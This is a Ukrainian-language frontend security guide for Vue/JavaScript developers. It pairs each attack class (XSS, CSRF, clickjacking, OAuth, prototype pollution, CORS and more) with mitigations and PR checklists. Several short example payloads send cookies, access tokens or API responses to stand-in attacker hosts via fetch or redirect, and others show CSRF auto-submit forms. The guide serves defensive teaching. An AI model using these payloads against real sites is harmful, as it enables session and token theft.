# Атаки на фронтенд: практичний довідник для JavaScript/TypeScript, Vue, HTML/CSS/SCSS і Tailwind CSS

Цей документ систематизує найважливіші атаки, з якими стикається сучасний фронтенд. Матеріал орієнтований на розробників рівня Junior+ і вище: з фокусом на реальні вектори, типові помилки в коді, приклади експлуатації в тестовому середовищі та практичні підходи до запобігання. Основна ціль — навчитися мислити «очима атакувальника», щоб проєктувати та реалізовувати захист на етапі розробки, а не після інциденту.

## Можливі атаки

### Cross-Site Scripting (XSS)

XSS — це виконання довільного JavaScript-коду в браузері жертви в контексті вашого домену. Для фронтенда це одна з найкритичніших атак, бо дозволяє красти токени, підміняти UI, перехоплювати дії користувача, читати дані зі сторінки та виконувати запити від імені користувача. У Vue ризик суттєво підвищується при використанні `v-html`, небезпечних шаблонів, ручного рендерингу HTML та неконтрольованих third-party віджетів.

#### Stored XSS (збережений XSS)

Шкідливий payload зберігається на сервері (коментарі, профіль, чат, CMS-поля), а потім відображається іншим користувачам. Це найнебезпечніший тип XSS через масовість.

Приклад як провести подібну атаку (лише для тестового стенда):

```html
<!-- Зловмисний коментар у полі, яке рендериться без санітизації -->
<img
  src="x"
  onerror="fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))"
/>
```

#### Reflected XSS (відбитий XSS)

Payload передається в URL/параметрі запиту і «відбивається» у відповіді сторінки без належного екранування. Часто використовується у фішингових посиланнях.

Приклад як провести подібну атаку:

```text
https://example.com/search?q=<svg/onload=alert('XSS')>
```

#### DOM-based XSS

Вразливість виникає повністю на клієнті: небезпечні API (`innerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`) отримують неперевірені дані (`location.hash`, `postMessage`, `localStorage`, query params).

Приклад як провести подібну атаку:

```js
// Уразливий код у фронтенді
const payload = new URLSearchParams(location.search).get("msg");
document.querySelector("#out").innerHTML = payload;
```

```text
https://example.com/?msg=<img src=x onerror=alert('DOM-XSS')>
```

#### Mutation XSS (mXSS)

Payload проходить «на вигляд безпечну» обробку, але після нормалізації/мутації DOM браузер перетворює його у виконувану конструкцію. Часто проявляється при недосконалій санітизації HTML.

Приклад як провести подібну атаку:

```html
<!-- Приклад залежить від sanitizer-а та браузера, типовий патерн -->
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

#### Як не допустити (методи захисту)

- [Фронтенд] Ніколи не вставляти неперевірений HTML у DOM (`innerHTML`, `v-html`, `insertAdjacentHTML`) без санітизації.
- [Фронтенд] Для Vue за замовчуванням використовувати інтерполяцію `{{ value }}`; `v-html` дозволяти лише для trusted-контенту.
- [Фронтенд] Додати HTML sanitizer (наприклад, DOMPurify) з суворим allowlist тегів/атрибутів і забороною inline-обробників (`onerror`, `onclick`).
- [Фронтенд] Заборонити небезпечні API (`eval`, `new Function`, `document.write`) через ESLint-правила й код-рев’ю.
- [Бекенд] Увімкнути CSP: мінімум `default-src 'self'; script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'self'`.
- [Фронтенд+Бекенд] Токени сесій не зберігати в `localStorage` при високому ризику XSS; віддавати перевагу `HttpOnly` cookie + серверний захист.
- [Фронтенд+Бекенд] Усі вхідні дані валідовувати і на фронтенді (для UX), і на бекенді (як єдина довірена перевірка).
- [Фронтенд] Додати security-тести: payload-набори для форм, query-параметрів, rich text полів.

> Санитизація це методи, які видаляють або екранують небезпечні частини вхідного HTML, щоб запобігти виконанню шкідливого коду. Вона не є панацеєю і повинна використовуватися разом з іншими практиками безпеки.

### Cross-Site Request Forgery (CSRF)

CSRF змушує браузер авторизованого користувача відправити небажаний запит на ваш бекенд (переказ коштів, зміна пошти/пароля, створення операцій). Якщо автентифікація базується на cookie і немає CSRF-захисту, ризик дуже високий.

#### CSRF через auto-submit форму

Зловмисник розміщує сторінку, яка автоматично надсилає POST-запит на цільовий сайт. Браузер жертви додає cookie сесію автоматично.

Приклад як провести подібну атаку:

```html
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

#### CSRF через простий GET endpoint

Якщо критична дія виконується через GET, достатньо завантажити зображення або iframe.

Приклад як провести подібну атаку:

```html
<img src="https://example.com/account/delete?confirm=true" />
```

#### Як не допустити (методи захисту)

- [Бекенд] Для state-changing операцій використовувати лише `POST/PUT/PATCH/DELETE`; заборонити критичні дії через `GET`.
- [Бекенд] На сервері перевіряти CSRF токени (synchronizer token або double submit cookie).
- [Бекенд] Встановити `SameSite=Lax` або `SameSite=Strict` для сесійних cookie (де сумісно з бізнес-флоу).
- [Бекенд] Перевіряти `Origin`/`Referer` для чутливих endpoint-ів.
- [Фронтенд+Бекенд] Вимагати підтвердження паролем/MFA для високоризикових дій (зміна email, пароля, фінансові операції).
- [Фронтенд] У SPA додати централізований HTTP-клієнт, який автоматично додає CSRF заголовок для мутаційних запитів.

### Clickjacking (UI redress)

Атака, за якої вашу сторінку вбудовують у прозорий `iframe` і користувач натискає «невидимі» елементи, думаючи, що взаємодіє з іншим інтерфейсом. Підходить для підтвердження платежів, видачі дозволів, зміни налаштувань.

#### Перекриття iframe фальшивим UI

Зловмисник накладає кнопки/банери поверх вашої вбудованої сторінки з точним позиціонуванням.

Приклад як провести подібну атаку:

```html
<iframe
  src="https://target.example/settings/security"
  style="opacity:0;position:absolute;top:0;left:0;width:100vw;height:100vh"
></iframe>
<button style="position:absolute;top:220px;left:360px">Отримати бонус</button>
```

#### Як не допустити (методи захисту)

- [Бекенд] На сервері виставити `X-Frame-Options: DENY` або `SAMEORIGIN`.
- [Бекенд] Використовувати CSP `frame-ancestors 'none'` (або точний allowlist, якщо вбудовування потрібне).
- [Фронтенд+Бекенд] Для критичних дій додати повторну верифікацію наміру (введення пароля, одноразовий код, re-auth).
- [Фронтенд] Не покладатися лише на JS frame-busting: це додатковий, а не основний захист.

### Open Redirect

Open Redirect дозволяє перенаправляти користувача на довільний зовнішній URL через «довірений» домен вашого сайту. Часто використовується у фішингу та chain-атаках (XSS + redirect, OAuth abuse).

#### Неперевірений параметр redirect

Фронтенд читає `?next=` або `?redirect=` і виконує `location.href = value` без allowlist-перевірки.

Приклад як провести подібну атаку:

```text
https://example.com/login?next=https://evil.example/fake-login
```

#### Як не допустити (методи захисту)

- [Фронтенд+Бекенд] Дозволяти redirect тільки на відносні шляхи або домени з жорсткого allowlist.
- [Фронтенд] Перед редіректом нормалізувати URL і відхиляти небезпечні схеми (`javascript:`, `data:`).
- [Фронтенд] Дефолтний fallback: безпечна внутрішня сторінка (`/dashboard`), якщо параметр невалідний.
- [Бекенд] Логувати підозрілі спроби редіректу для подальшого моніторингу.

### OAuth/OIDC токен-атаки у SPA

SPA часто працює з access token / id token. Помилки зберігання, валідації або маршрутизації призводять до компрометації сесії.

#### Викрадення токена через XSS

Якщо токен зберігається в `localStorage` або `sessionStorage`, XSS миттєво його читає.

Приклад як провести подібну атаку:

```js
fetch(
  "https://attacker.example/t?tok=" +
    encodeURIComponent(localStorage.getItem("access_token")),
);
```

#### Підміна `redirect_uri` / слабка перевірка `state`

Якщо на клієнті або сервері некоректно перевіряється `state`, можливі атаки повторного використання коду авторизації та прив’язки чужої сесії.

Приклад як провести подібну атаку:

```text
https://idp.example/auth?client_id=app&redirect_uri=https://example.com/callback&state=123
```

#### Як не допустити (методи захисту)

- [Фронтенд+Бекенд] Для SPA використовувати Authorization Code + PKCE; уникати implicit flow.
- [Бекенд] `redirect_uri` має бути зафіксований на IdP і перевірятися як точний збіг.
- [Фронтенд+Бекенд] Генерувати криптостійкий `state` і `nonce`, перевіряти їх на callback.
- [Бекенд] Access token робити короткоживучим; refresh token — обмежувати ротацією та детекцією reuse.
- [Бекенд] Мінімізувати scope токена за принципом найменших привілеїв.
- [Фронтенд] Не виводити токени в логи, URL, telemetry payload.

### Атаки через postMessage

`window.postMessage` потрібен для iframe/міжвіконної взаємодії, але неправильна перевірка `origin` дозволяє стороннім доменам передати небезпечні команди або витягнути чутливі дані.

#### Прийом повідомлень без перевірки `event.origin`

Додаток обробляє будь-який message як довірений.

Приклад як провести подібну атаку:

```js
// Зловмисний сайт
targetWindow.postMessage({ type: "SET_TOKEN", token: "attacker-token" }, "*");
```

#### Як не допустити (методи захисту)

- [Фронтенд] Завжди перевіряти `event.origin` і, за потреби, `event.source` проти allowlist.
- [Фронтенд] Не використовувати `*` у `targetOrigin` для чутливих повідомлень.
- [Фронтенд] Валідувати структуру `event.data` (наприклад, Zod/TypeScript runtime schema).
- [Фронтенд] Розділити канали повідомлень за типами команд; критичні команди захищати додатковим підписом/nonce.
- [Фронтенд] Не передавати через postMessage секрети, які можна витягнути при XSS.

### Prototype Pollution (клієнтська частина)

Через небезпечне глибоке злиття об’єктів (`merge`, `assign`, сторонні утиліти) з payload-ами типу `__proto__` можна змінити прототип глобальних об’єктів. Наслідки: обходи перевірок, підміна логіки, інколи передумови до XSS/RCE на суміжних рівнях.

#### Забруднення через query/JSON merge

Якщо вхідні дані напряму мержаться в конфіг без фільтрації ключів.

Приклад як провести подібну атаку:

```js
// Payload у JSON
{"__proto__":{"isAdmin":true}}
```

```js
// Потім у коді
if (user.isAdmin) {
  /* обхід ролей */
}
```

#### Як не допустити (методи захисту)

- [Фронтенд] Заборонити merge неперевірених об’єктів у глобальні конфіги/стан.
- [Фронтенд] Фільтрувати ключі `__proto__`, `prototype`, `constructor` перед злиттям.
- [Фронтенд] Використовувати безпечні утиліти merge актуальних версій; регулярно оновлювати залежності.
- [Фронтенд] Для словників застосовувати `Object.create(null)` там, де доречно.
- [Фронтенд+Бекенд] Валідувати вхідні payload-и за whitelist схемою, а не «довіряти будь-якому JSON».

### Dependency/Supply Chain атаки

Фронтенд критично залежить від npm-екосистеми. Компрометація пакета, typo-squatting, dependency confusion або шкідливий postinstall-скрипт можуть інтегрувати бекдор у збірку.

#### Typosquatting

Встановлення пакета зі схожою назвою (`lodas` замість `lodash`).

Приклад як провести подібну атаку:

```bash
npm install vue-rouetr
```

#### Dependency confusion

Якщо внутрішні пакети мають імена без приватного namespace, зовнішній пакет із вищою версією може бути підтягнутий замість внутрішнього.

Приклад як провести подібну атаку:

```text
Публікація пакета @fake/internal-utils версії 99.0.0 з шкідливим кодом
```

#### Як не допустити (методи захисту)

- [Фронтенд] Використовувати lockfile (`package-lock.json`/`pnpm-lock.yaml`) і встановлення через `npm ci` у CI.
- [Фронтенд+Бекенд] Увімкнути приватний registry/namespace для внутрішніх пакетів.
- [Фронтенд+Бекенд] Налаштувати політики provenance/signature (де доступно) та перевірку publisher trust.
- [Фронтенд] Регулярно запускати `npm audit`/SCA-сканери, але не автофіксити критичні оновлення без тестів.
- [Фронтенд] Обмежити або заборонити lifecycle scripts (`postinstall`) для неперевірених пакетів.
- [Фронтенд] Рев’ювати нові залежності так само суворо, як і власний код.

### CSS-based атаки та UI-маніпуляції

CSS не виконує JS, але може сприяти витоку даних (історично), fingerprinting, маскуванню інтерфейсу, перехопленню взаємодії та обходу UX-попереджень.

#### UI spoofing через CSS overlay

Зловмисний стиль робить елемент невидимим/зміщеним, а користувач клікає «не туди».

Приклад як провести подібну атаку:

```css
.real-confirm-button {
  opacity: 0;
  position: absolute;
  z-index: 9999;
}
.fake-safe-button {
  position: relative;
  z-index: 1;
}
```

#### CSS injection через динамічні стилі

Якщо значення класів/стилів формуються з неперевіреного вводу (особливо при `:style` у Vue), можна порушити видимість security-critical елементів.

Приклад як провести подібну атаку:

```js
const userTheme = "position:fixed;inset:0;background:#fff;z-index:99999";
element.setAttribute("style", userTheme);
```

#### Як не допустити (методи захисту)

- [Фронтенд] Не приймати довільні CSS-рядки від користувача; дозволяти тільки безпечні токени теми.
- [Фронтенд] Для Vue/Tailwind використовувати whitelist класів замість `:style` з user input.
- [Фронтенд] Захищати критичні UI-елементи (підтвердження, оплата) від приховування стилями.
- [Фронтенд] У code review перевіряти можливість overlay/spoofing у компонентах модалок і кнопок.
- [Фронтенд] Додати візуальні E2E тести для security-critical флоу (видимість кнопок, правильні тексти).

### CORS misconfiguration exploitation

Неправильний CORS (`Access-Control-Allow-Origin: *` разом із credentials, занадто широка allowlist, regex-помилки) дозволяє стороннім сайтам читати API-відповіді.

#### Whitelist bypass через слабкий матчинг origin

Наприклад, бекенд дозволяє всі origin, що «містять» `example.com`.

Приклад як провести подібну атаку:

```text
https://example.com.attacker.tld
```

#### Як не допустити (методи захисту)

- [Бекенд] Налаштувати точний allowlist origin-ів, без wildcard для credential-запитів.
- [Бекенд] Не поєднувати `Access-Control-Allow-Origin: *` з `Access-Control-Allow-Credentials: true`.
- [Бекенд] Порівнювати origin точним збігом схеми+хоста+порту, без `contains`/regex-пасток.
- [Бекенд] Обмежити дозволені методи/заголовки до мінімуму (`GET, POST` тощо за потребою).
- [Бекенд] Критичні дані додатково захищати серверною авторизацією незалежно від CORS.

### Ін’єкції через URL-схеми та небезпечні атрибути

Небезпечно рендерити користувацькі `href/src` без валідації схеми. `javascript:`, `data:` та інколи `vbscript:` (legacy) можуть призводити до XSS або фішингу.

#### JavaScript URI injection

Неперевірене значення в атрибуті посилання.

Приклад як провести подібну атаку:

```html
<a href="javascript:alert('owned')">Підтвердження</a>
```

#### Як не допустити (методи захисту)

- [Фронтенд] Валідувати `href/src` за allowlist схем (`https:`, `mailto:`, `tel:` за потребою).
- [Фронтенд] Явно блокувати `javascript:`, `data:` (крім контрольованих винятків), `vbscript:`.
- [Фронтенд] Для зовнішніх URL використовувати безпечний parser і нормалізацію перед рендером.
- [Фронтенд] У компонентах посилань мати єдиний safe-wrapper, а не ручний рендер у різних місцях.

### Tabnabbing

Якщо зовнішнє посилання відкривається в новій вкладці через `target="_blank"` без `rel="noopener noreferrer"`, нова сторінка може отримати `window.opener` і перезаписати вкладку оригіналу фішинговою сторінкою.

#### Захоплення вкладки через `window.opener`

Приклад як провести подібну атаку:

```js
// На сторонньому сайті, який відкрився у новій вкладці
if (window.opener) {
  window.opener.location = "https://phishing.example/login";
}
```

#### Як не допустити (методи захисту)

- [Фронтенд] Для всіх зовнішніх посилань з `target="_blank"` додавати `rel="noopener noreferrer"`.
- [Фронтенд] У Vue створити спільний компонент `ExternalLink`, який примусово виставляє безпечні атрибути.
- [Фронтенд] Додати lint-правило/AST-перевірку на небезпечний `target="_blank"`.

### Витік секретів і чутливих даних у фронтенді

Секрети в SPA — це не секрети. Будь-який ключ у бандлі, source map або runtime-об’єкті доступний користувачу. Часті витоки: API keys, внутрішні URL, debug endpoints, токени в логах.

#### Витік через source maps

Продакшн-карти джерел можуть містити оригінальні шляхи, коментарі, логіку, іноді hardcoded значення.

Приклад як провести подібну атаку:

```text
GET https://example.com/assets/app.js.map
```

#### Витік через env-перемінні

У Vite усе, що починається на `VITE_`, потрапляє в клієнтський бандл.

Приклад як провести подібну атаку:

```ts
console.log(import.meta.env.VITE_API_KEY);
```

#### Як не допустити (методи захисту)

- [Фронтенд] Не вбудовувати секрети у фронтенд-бандл: усе конфіденційне — тільки на сервері.
- [Фронтенд] У Vite виносити у `VITE_` лише публічні значення, без ключів з високими привілеями.
- [Фронтенд+Бекенд] Вимкнути або обмежити source maps у production (`hidden-source-map`/закритий доступ).
- [Фронтенд] Прибрати debug-логи з токенами/PII; додати sanitizer для telemetry.
- [Фронтенд+Бекенд] Регулярно сканувати бандл і репозиторій на витоки секретів.

### Атаки через Service Worker

Компрометований або неправильно керований Service Worker перехоплює мережеві запити, кешує підроблені відповіді та переживає перезавантаження сторінки, створюючи стійкий канал атаки.

#### Підміна ресурсів через SW cache poisoning

Якщо логіка кешування не валідує джерело/хеш ресурсу.

Приклад як провести подібну атаку:

```js
self.addEventListener("fetch", (event) => {
  event.respondWith(caches.match("/app.js")); // підміна старим/шкідливим варіантом
});
```

#### Як не допустити (методи захисту)

- [Фронтенд] Обмежити зону дії SW (`scope`) і реєструвати його тільки там, де потрібен offline/caching.
- [Фронтенд] Версіонувати кеші та видаляти застарілі записи при `activate`.
- [Фронтенд] Кешувати лише очікувані ресурси; для критичних скриптів перевіряти цілісність/хеш.
- [Фронтенд] Для релізів застосовувати контрольовану стратегію оновлення SW (skipWaiting + client messaging).
- [Фронтенд+Бекенд] Забезпечити HTTPS і правильні cache-control заголовки для app shell.

### Race-condition на фронтенді (TOCTOU у UI)

Навіть якщо фінальна перевірка на бекенді є, фронтенд-гонки дозволяють обійти бізнес-обмеження, дублювати операції, створювати неузгоджені стани (подвійна оплата, повторне списання, множинна реєстрація).

#### Double-submit атака

Користувач/скрипт викликає критичну дію багато разів до блокування кнопки/оновлення стану.

Приклад як провести подібну атаку:

```js
for (let i = 0; i < 20; i++)
  fetch("/api/order/submit", { method: "POST", credentials: "include" });
```

#### Як не допустити (методи захисту)

- [Фронтенд] На фронтенді блокувати повторні submit-и (`isSubmitting`, disable кнопки, debounce/throttle).
- [Бекенд] На бекенді впровадити idempotency keys для критичних операцій.
- [Бекенд] Робити атомарні серверні перевірки і транзакції; не покладатися на стан UI.
- [Фронтенд] Уникати гонок при навігації: скасовувати попередні запити (`AbortController`).
- [Фронтенд] Додати автотести на сценарії подвійного кліку та повторних запитів.

### Business Logic Abuse через клієнтські перевірки

Клієнтські валідації (ліміти, ролі, ціни, знижки) не є довіреним джерелом істини. Атакувальник може змінити параметри в DevTools або перехопити запит через proxy.

#### Підміна ціни/ролі в payload

Якщо бекенд не перевалідує значення, можливе шахрайство.

Приклад як провести подібну атаку:

```json
{
  "productId": 1001,
  "price": 1,
  "role": "admin"
}
```

#### Як не допустити (методи захисту)

- [Бекенд] Усі критичні бізнес-правила перевіряти на сервері (ціна, ліміти, ролі, знижки).
- [Фронтенд] На фронтенді залишати лише UX-валідацію та підказки, без довіри до результату.
- [Бекенд] Сервер має обчислювати чутливі поля самостійно (наприклад, фінальна ціна).
- [Бекенд] Вести аудит змін привілеїв і аномальних операцій користувачів.
- [Фронтенд+Бекенд] Проводити threat modeling для кожного фінансового/адмінського use-case.

### GraphQL/REST overexposure з боку клієнта

Фронтенд може ненавмисно надавати зловмиснику карту API: типи, поля, службові endpoint-и, зайві права токена, доступні операції через IDE/інтроспекцію.

#### Масовий збір даних через надмірно широкі запити

Якщо API не має обмежень depth/complexity/rate, клієнтський токен можна використати для data scraping.

Приклад як провести подібну атаку:

```graphql
query {
  users(first: 10000) {
    nodes {
      id
      email
      phone
      address
      orders {
        total
        items {
          sku
        }
      }
    }
  }
}
```

#### Як не допустити (методи захисту)

- [Бекенд] На GraphQL вимкнути introspection у production (або обмежити за ролями/IP).
- [Бекенд] Ввести ліміти depth/complexity та строгий rate limiting.
- [Бекенд] Мінімізувати дані у відповідях (тільки потрібні поля, pagination за замовчуванням).
- [Бекенд] На REST приховати службові endpoint-и від публічних клієнтів, сегментувати API за ролями.
- [Бекенд] Використовувати короткоживучі токени з мінімальними scope.

### ReDoS та клієнтське виснаження ресурсів

Невдалі регулярні вирази у валідації форм можуть блокувати головний потік браузера на довгий час. Це DoS на рівні вкладки/клієнта.

#### Катастрофічний backtracking

Складний regex на спеціально підібраному рядку.

Приклад як провести подібну атаку:

```js
const r = /^(a+)+$/;
r.test("a".repeat(30) + "!");
```

#### Як не допустити (методи захисту)

- [Фронтенд] Уникати regex-конструкцій з потенційним катастрофічним backtracking.
- [Фронтенд] Для складної валідації використовувати лінійні парсери або перевірені бібліотеки.
- [Фронтенд+Бекенд] Обмежувати довжину вводу до валідації (client + server).
- [Фронтенд] Для важких обчислень використовувати Web Worker, щоб не блокувати main thread.
- [Фронтенд] Додати perf-тести для «поганих» рядків і граничних значень.

### MIME sniffing і content-type confusion

Якщо ресурси віддаються з некоректними заголовками, браузер може інтерпретувати контент інакше (наприклад, HTML замість тексту), що відкриває шлях до виконання коду або обходу політик.

#### Підміна типу файлу

Завантаження файлу, який виглядає як зображення, але рендериться як HTML/JS у неправильному контексті.

Приклад як провести подібну атаку:

```text
avatar.jpg  -> фактичний вміст: <script>alert('xss')</script>
```

#### Як не допустити (методи захисту)

- [Бекенд] На сервері виставляти коректний `Content-Type` і `X-Content-Type-Options: nosniff`.
- [Бекенд] Для завантажень перевіряти MIME + magic bytes, а не лише розширення файлу.
- [Бекенд] Ніколи не рендерити user-upload як активний HTML у вашому origin.
- [Бекенд] Для файлів користувачів використовувати окремий домен/сабдомен без cookie сесії.

### Атаки через сторонні скрипти/віджети

Аналітика, чати, A/B-платформи, пікселі реклами отримують повний доступ до DOM-дерева. Компрометація постачальника або акаунта менеджера тегів = компрометація вашого фронтенда.

#### Компрометація через Tag Manager

Зловмисник додає шкідливий тег, який виконується для всіх користувачів.

Приклад як провести подібну атаку:

```html
<script src="https://trusted-tag-manager.example/container.js"></script>
<!-- у контейнері динамічно інжектиться сторонній payload -->
```

#### Як не допустити (методи захисту)

- [Фронтенд] Мінімізувати кількість third-party скриптів, особливо з доступом до всіх сторінок.
- [Фронтенд] Для статичних ресурсів застосовувати Subresource Integrity (SRI), де це технічно можливо.
- [Фронтенд+Бекенд] Обмежити CSP `script-src` точним allowlist і вимкнути `unsafe-inline`.
- [Фронтенд+Бекенд] Розділити права доступу до Tag Manager, увімкнути 2FA і журнал аудиту змін.
- [Фронтенд] Проводити регулярний inventory сторонніх інтеграцій і видаляти зайві.

### Атаки на автентифікаційний UX (phishing-in-the-app)

Фронтенд-інтерфейс можна підробити всередині реального застосунку (модалка повторного логіну, фальшивий MFA prompt, оманливі сповіщення), щоб виманити пароль/OTP.

#### In-app фішинг через підміну модалки

Через XSS або компрометацію залежності зловмисник показує автентичну на вигляд форму.

Приклад як провести подібну атаку:

```html
<div class="fixed inset-0 bg-black/60 flex items-center justify-center">
  <form class="bg-white p-6 rounded">
    <h2>Сесія завершена. Увійдіть повторно</h2>
    <input type="password" placeholder="Пароль" />
  </form>
</div>
```

#### Як не допустити (методи захисту)

- [Фронтенд] Логін/MFA форми відображати через уніфікований, контрольований компонент із перевіреним дизайном.
- [Фронтенд+Бекенд] Підтвердження критичних дій робити через trusted channel (наприклад, push/окремий домен IdP).
- [Фронтенд] Додати anti-phishing UX-маркери: стабільні тексти, домен, персоналізовані сигнали.
- [Фронтенд+Бекенд] Зменшити ймовірність XSS (головний шлях до in-app phishing) через CSP + санітизацію.
- [Фронтенд] Навчити команду та користувачів розпізнавати підозрілі запити на повторний пароль/OTP.

### Denial of UI Service (DoUS)

Атакувальник навмисно руйнує працездатність клієнта: великі payload-и, нескінченні цикли в обробниках, важкі рендери, провокування memory leaks через маршрутні переходи.

#### Перевантаження рендерингу великими структурами

Непагінований список або JSON у мільйони елементів змушує вкладку «падати».

Приклад як провести подібну атаку:

```js
const huge = Array.from({ length: 2_000_000 }, (_, i) => ({
  id: i,
  text: "x".repeat(200),
}));
appState.items = huge;
```

#### Як не допустити (методи захисту)

- [Фронтенд] Впровадити пагінацію/віртуалізацію списків (`virtual scroller`) для великих наборів даних.
- [Фронтенд+Бекенд] Обмежити розмір payload-ів на бекенді та у фронтенд-клієнті.
- [Фронтенд] Профілювати рендеринг і очищати підписки/таймери при unmount.
- [Фронтенд] Захистити ресурсоємні операції debounce/throttle і кешуванням.
- [Фронтенд] Додати guardrail-метрики (TTI, long tasks, memory growth) у RUM/monitoring.

### Атаки через помилки маршрутизації та guard-ів у Vue

`beforeEach` guard у Vue Router покращує UX, але не є security boundary. Якщо доступ до екрану/дії обмежується тільки фронтендом, зловмисник обійде це прямим API-запитом.

#### Обхід клієнтського guard-а

Користувач змінює стан у DevTools або напряму викликає API.

Приклад як провести подібну атаку:

```js
// У консолі браузера
localStorage.setItem("role", "admin");
router.push("/admin");
```

#### Як не допустити (методи захисту)

- [Фронтенд] Вважати Vue Router guard лише UX-механізмом; справжню авторизацію робити на сервері.
- [Бекенд] При кожному чутливому API-запиті перевіряти роль/дозвіл на бекенді.
- [Фронтенд] Не зберігати критичні ознаки ролі в localStorage як єдине джерело істини.
- [Фронтенд] На фронтенді приховувати недоступні елементи, але не покладатися на це для безпеки.
- [Фронтенд] Додати інтеграційні тести на сценарії ручного обходу guard-ів.

### Відсутність/слабкість CSP як мультиплікатор ризику

CSP (Content Security Policy) не усуває першопричину XSS, але різко зменшує його наслідки. Без CSP навіть дрібний HTML injection часто ескалує до повноцінного виконання скриптів.

#### Ескалація через inline script

При відсутності `script-src` обмежень inline payload виконується без бар’єрів.

Приклад як провести подібну атаку:

```html
<script>
  fetch("/api/me", { credentials: "include" })
    .then((r) => r.text())
    .then((x) => (location = "https://attacker/?d=" + btoa(x)));
</script>
```

#### Як не допустити (методи захисту)

- [Бекенд] Запровадити сувору CSP з nonce/hash для скриптів і без `unsafe-inline`.
- [Бекенд] Використовувати `object-src 'none'`, `base-uri 'self'`, `frame-ancestors` за політикою продукту.
- [Фронтенд+Бекенд] Спочатку запускати CSP у `Report-Only`, аналізувати репорти, потім переводити в enforcement.
- [Фронтенд] Поєднувати CSP з Trusted Types (де можливо) для додаткового захисту від DOM XSS.
- [Фронтенд+Бекенд] Регулярно переглядати політику при додаванні нових бібліотек/доменів.

## Швидка перевірка в PR (чеклісти по атаках)

### XSS

- Немає небезпечних вставок через `v-html`, `innerHTML`, `insertAdjacentHTML` без sanitizer.
- Усі user-generated поля рендеряться як текст, а не як HTML.
- Відсутні `eval`, `new Function`, `document.write`.
- Для rich text використовується централізована санітизація.
- CSP не послаблено без обґрунтування.

### CSRF

- Критичні дії не виконуються через `GET`.
- Мутаційні запити проходять із CSRF-токеном.
- Cookie мають коректний `SameSite` режим.
- На бекенді є перевірка `Origin/Referer` для чутливих endpoint-ів.
- Для критичних дій є re-auth/MFA або додаткове підтвердження.

### Clickjacking

- Виставлено `X-Frame-Options` і/або `frame-ancestors` у CSP.
- Немає сторінок із критичними діями, які можна вбудувати у `iframe`.
- Security-critical кнопки мають додаткову верифікацію наміру.
- Не використовується лише JS frame-busting як єдиний захист.
- Політика вбудовування формалізована в документації.

### Open Redirect

- `next/redirect` параметри проходять allowlist-перевірку.
- Дозволені лише відносні URL або контрольований список доменів.
- Заборонені схеми `javascript:`/`data:`.
- Є безпечний fallback-редірект за невалідного параметра.
- Підозрілі редірект-спроби логуються.

### OAuth/OIDC токен-атаки

- Використовується Authorization Code + PKCE.
- `state` і `nonce` генеруються та перевіряються на callback.
- `redirect_uri` не є довільним і строго перевіряється.
- Scope токена мінімально необхідний.
- Токени не потрапляють у логи, URL і telemetry.

### postMessage

- Кожен listener перевіряє `event.origin`.
- Для `postMessage` не використовується `targetOrigin: '*'` у чутливих кейсах.
- `event.data` проходить runtime-валідацію схеми.
- Критичні команди ізольовані/підписані.
- Немає передачі секретів через message-канал.

### Prototype Pollution

- Неперевірені об’єкти не мержаться в глобальний стан/конфіг.
- Ключі `__proto__`, `prototype`, `constructor` відфільтровані.
- Використовуються безпечні версії merge-утиліт.
- Для словників застосовано безпечні структури (`Object.create(null)`, Map).
- Payload-и валідовуються за whitelist-схемою.

### Dependency/Supply Chain

- Залежності фіксовані lockfile, у CI використовується `npm ci`.
- Нові пакети проходять рев’ю походження/maintainer-ів.
- Налаштовано аудит вразливостей і регулярне оновлення.
- Внутрішні пакети захищені приватним registry/namespace.
- Lifecycle scripts не виконуються без потреби.

### CSS/UI-маніпуляції

- Відсутні довільні inline-стилі з user input.
- Динамічні класи базуються на whitelist токенів.
- Критичні елементи UI неможливо приховати/перекрити неперевіреним стилем.
- Є візуальні тести для security-critical сценаріїв.
- Overlay/зміщення елементів перевірено у code review.

### CORS misconfiguration

- Для credential-запитів не використовується `Access-Control-Allow-Origin: *`.
- Allowlist origin-ів реалізовано точним збігом.
- Немає небезпечного `contains`/regex матчінгу домену.
- Дозволені методи/заголовки мінімізовані.
- CORS не розглядається як єдиний механізм авторизації.

### URL-схеми й небезпечні атрибути

- Усі `href/src` проходять валідацію схеми.
- Заборонені `javascript:` і неконтрольовані `data:` URI.
- Використовується єдиний safe-компонент для зовнішніх посилань.
- URL нормалізується перед рендером.
- Немає прямого пробросу user input у атрибути.

### Tabnabbing

- Для зовнішніх `target="_blank"` завжди є `rel="noopener noreferrer"`.
- Наявний спільний компонент зовнішніх лінків із безпечними дефолтами.
- Лінтер/перевірка PR блокує порушення.
- У контенті CMS також контролюються атрибути посилань.
- Команда знає ризик `window.opener` і не ігнорує його.

### Витік секретів у фронтенді

- У бандл не потрапляють приватні ключі/секрети.
- `VITE_` змінні містять лише публічні значення.
- Source maps у production відключені або обмежені доступом.
- Логи очищені від токенів і PII.
- Є регулярний секрет-скан репозиторію та артефактів.

### Service Worker

- Scope SW мінімально необхідний.
- Кеші версіонуються та очищуються при оновленні.
- Критичні ресурси не віддаються з недовіреного кешу.
- Логіка `fetch` не дозволяє підміну чутливих відповідей.
- Процес оновлення SW задокументований і тестується.

### Race-condition (TOCTOU у UI)

- Кнопки submit блокуються під час запиту.
- Для критичних операцій використовуються idempotency keys.
- Запити можна коректно скасувати (`AbortController`).
- Серверні перевірки атомарні і не залежать від стану UI.
- Є тести на double-click/double-submit.

### Business Logic Abuse

- Критичні правила (ціна, роль, ліміт) перевіряються на бекенді.
- Фронтенд не надсилає/не приймає довірено чутливі поля без серверної перевірки.
- Роль/права не визначаються лише клієнтським станом.
- Є аудит аномальних бізнес-операцій.
- Для нових фіч виконано threat modeling.

### GraphQL/REST overexposure

- API повертає тільки потрібні поля й підтримує пагінацію.
- Налаштовано depth/complexity/rate limits.
- Introspection у production обмежено.
- Токени мають мінімальні scope.
- Службові endpoint-и не доступні публічному клієнту.

### ReDoS

- Regex перевірені на катастрофічний backtracking.
- Довжина вводу обмежена до валідації.
- Складні перевірки винесені у безпечні парсери/бібліотеки.
- Важкі обчислення не блокують main thread.
- Є perf-тести на граничні case-и.

### MIME sniffing / content-type confusion

- Для відповідей виставлено коректний `Content-Type`.
- Увімкнено `X-Content-Type-Options: nosniff`.
